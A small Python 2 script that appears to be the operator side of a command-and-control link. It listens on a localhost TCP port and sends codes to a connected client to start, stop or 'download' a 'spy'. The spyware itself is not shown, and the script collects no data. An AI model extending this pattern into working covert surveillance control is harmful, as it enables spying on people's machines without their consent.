import socket

def start_spy():
    command = "A001"
    sock.send(command)
    check = sock.recv(1024)
    if check == "1111":
        return "Spy is on."
    else:
        return "Error. Please repeate."
    return check

def stop_spy():
    command = "A002"
    sock.send(command)
    check = sock.recv(1024)
    if check == "1111":
        return "Spy is off."
    else:
        return "Error. Please repeate."
    return check

def download_spy():
    command = "A003"
    sock.send(command)
    check = sock.recv(1024)
    if check == "1111":
        return "Spy was downloaded."
    else:
        return "Error. Please repeate."
    return check

HOST = "localhost" # localhost
PORT = 48526

srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.bind((HOST,PORT))

srv.listen(1)
sock, addr = srv.accept()

print "Choose your destiny: "
ch = input()

if ch == 1:
    comm = start_spy()
if ch == 2:
    comm = stop_spy()
if ch == 3:
    comm = download_spy()  

print addr, comm

sock.close()

